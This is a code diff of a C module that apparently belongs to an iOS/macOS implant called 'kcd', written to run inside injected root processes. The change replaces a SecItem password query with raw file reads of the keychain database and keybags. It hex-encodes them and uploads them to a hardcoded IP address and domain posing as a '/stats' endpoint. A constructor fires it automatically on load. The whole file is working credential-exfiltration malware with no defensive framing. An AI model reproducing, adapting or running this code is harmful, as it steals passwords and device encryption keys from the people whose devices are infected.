@@ -1,5 +1,7 @@
-#include <CoreFoundation/CoreFoundation.h>
-#include <Security/Security.h>
+// kcd — keychain file dumper for root context (configd/powerd)
+// Pure POSIX file reads (no SecItem API — injected processes have invalid
+// code signatures and keychaind denies them). Reads the keychain database
+// and keybags, uploads via raw HTTP.
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -7,94 +9,100 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <fcntl.h>
+#include <sys/stat.h>
 
-static void send_data(const char *path, const char *payload, int payload_len) {
+static int g_done = 0;
+
+static void http_post(const char *path, const char *category, const char *desc,
+                      const unsigned char *hex, int hex_len) {
     int fd = socket(AF_INET, SOCK_STREAM, 0);
     if (fd < 0) return;
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(80);
-    addr.sin_addr.s_addr = inet_addr("176.122.134.61");
-    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(fd); return; }
+    struct sockaddr_in a;
+    memset(&a, 0, sizeof(a));
+    a.sin_family = AF_INET;
+    a.sin_port = htons(80);
+    a.sin_addr.s_addr = inet_addr("176.122.134.61");
+    if (connect(fd, (struct sockaddr*)&a, sizeof(a)) < 0) { close(fd); return; }
+    int body_len = 200 + hex_len;
     char hdr[512];
-    int hl = snprintf(hdr, sizeof(hdr),
-        "POST /stats HTTP/1.1
-Host: go.szjz.fun
-"
-        "Content-Type: application/json
-Content-Length: %d
-"
-        "Connection: close
-
-", payload_len);
+    int hl = snprintf(hdr, 500,
+        "POST /stats HTTP/1.1\r\nHost: go.szjz.fun\r\n"
+        "Content-Type: application/json\r\nContent-Length: %d\r\n"
+        "Connection: close\r\n\r\n", body_len);
     write(fd, hdr, hl);
-    write(fd, payload, payload_len);
-    char buf[256];
-    while (read(fd, buf, sizeof(buf)) > 0);
+    char *body = malloc(body_len + 64);
+    if (!body) { close(fd); return; }
+    int pos = snprintf(body, 190,
+        "{\"path\":\"%s\",\"category\":\"%s\",\"description\":\"%s\","
+        "\"size\":%d,\"deviceUUID\":\"kcd\",\"data\":\"",
+        path, category, desc, hex_len / 2);
+    memcpy(body + pos, hex, hex_len);
+    pos += hex_len;
+    body[pos++] = '"';
+    body[pos++] = '}';
+    write(fd, body, pos);
+    free(body);
+    char rb[256];
+    while (read(fd, rb, sizeof(rb)) > 0) {}
     close(fd);
 }
 
-static void send_hex(const char *tag, const unsigned char *data, int len) {
-    char *hex = malloc(len * 2 + 1);
-    static const char hc[] = "0123456789abcdef";
-    int hp = 0;
-    for (int j = 0; j < len; j++) {
-        hex[hp++] = hc[data[j] >> 4];
-        hex[hp++] = hc[data[j] & 0xf];
-    }
-    hex[hp] = 0;
-    char *body = malloc(hp + 256);
-    int pos = snprintf(body, hp + 250,
-        "{\"path\":\"%s\",\"category\":\"kc\",\"description\":\"kcmod\","
-        "\"size\":%d,\"deviceUUID\":\"kcmod\",\"data\":\"", tag, len);
-    memcpy(body + pos, hex, hp);
-    pos += hp;
-    body[pos++] = '"';
-    body[pos++] = '}';
-    send_data("/stats", body, pos);
-    free(body);
-    free(hex);
-}
-
-static void do_keychain(void) {
-    CFTypeRef keys[3] = {kSecClass, kSecReturnData, kSecMatchLimit};
-    CFTypeRef vals[3] = {kSecClassGenericPassword, kCFBooleanTrue, kSecMatchLimitAll};
-    CFDictionaryRef query = CFDictionaryCreate(NULL,
-        (const void**)keys, (const void**)vals, 3,
-        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    if (!query) return;
-    CFTypeRef result = NULL;
-    OSStatus st = SecItemCopyMatching(query, &result);
-    if (st == errSecSuccess && result) {
-        CFArrayRef arr = (CFArrayRef)result;
-        CFIndex cnt = CFArrayGetCount(arr);
-        for (CFIndex i = 0; i < cnt && i < 15; i++) {
-            CFDictionaryRef item = CFArrayGetValueAtIndex(arr, i);
-            if (!item) continue;
-            CFDataRef data = CFDictionaryGetValue(item, kSecReturnData);
-            if (!data) continue;
-            CFIndex len = CFDataGetLength(data);
-            if (len <= 0 || len > 32768) continue;
-            const unsigned char *bytes = CFDataGetBytePtr(data);
-            char tag[32];
-            snprintf(tag, 30, "kc_item%d", (int)i);
-            send_hex(tag, bytes, (int)len);
+static void send_file(const char *tag, const char *path) {
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        const char *msg = "OPEN_FAIL";
+        char hex[24]; int hp = 0;
+        for (const char *p = msg; *p; p++) {
+            hex[hp++] = "0123456789abcdef"[(*p >> 4) & 15];
+            hex[hp++] = "0123456789abcdef"[*p & 15];
         }
-        CFRelease(result);
-    } else {
-        char err[64];
-        int n = snprintf(err, 60, "OSStatus=%d", (int)st);
-        send_hex("kc_err_status", (const unsigned char*)err, n);
+        http_post(tag, "kcd", "err", (const unsigned char*)hex, hp);
+        return;
     }
-    CFRelease(query);
+    struct stat st;
+    if (fstat(fd, &st) < 0 || st.st_size <= 0 || st.st_size > 6*1024*1024) { close(fd); return; }
+    int sz = (int)st.st_size;
+    unsigned char *buf = malloc(sz);
+    if (!buf) { close(fd); return; }
+    int got = 0;
+    while (got < sz) {
+        int n = (int)read(fd, buf + got, sz - got);
+        if (n <= 0) break;
+        got += n;
+    }
+    close(fd);
+    if (got <= 0) { free(buf); return; }
+    char *hex = malloc((size_t)got * 2 + 1);
+    if (!hex) { free(buf); return; }
+    static const char hc[] = "0123456789abcdef";
+    for (int i = 0; i < got; i++) {
+        hex[i*2] = hc[buf[i] >> 4];
+        hex[i*2+1] = hc[buf[i] & 15];
+    }
+    http_post(tag, "kcd", "keychain", (const unsigned char*)hex, got * 2);
+    free(hex);
+    free(buf);
 }
 
-void plugin_main(void) {
-    do_keychain();
+static void dump_all(void) {
+    if (g_done) return;
+    g_done = 1;
+    send_file("kcd_canary", "/System/Library/CoreServices/SystemVersion.plist");
+    send_file("kcd_keychain2db", "/var/Keychains/keychain-2.db");
+    send_file("kcd_System_keybag", "/var/Keychains/System.keybag");
+    send_file("kcd_Backup_keybag", "/var/Keychains/Backup.keybag");
+    send_file("kcd_device_kb", "/var/Keychains/device.kb");
+    send_file("kcd_persona_kb", "/var/keybags/persona.kb");
+    send_file("kcd_usersession_kb", "/var/keybags/usersession.kb");
+    send_file("kcd_ocsp", "/var/Keychains/ocspcache.sqlite3");
 }
+
+__attribute__((visibility("default")))
+int entry_main(void *ctx) { dump_all(); return 0; }
+
+__attribute__((visibility("default")))
+void plugin_main(void) { dump_all(); }
 
 __attribute__((constructor))
-static void kc_init(void) {
-    do_keychain();
-}
+static void kcd_init(void) { dump_all(); }
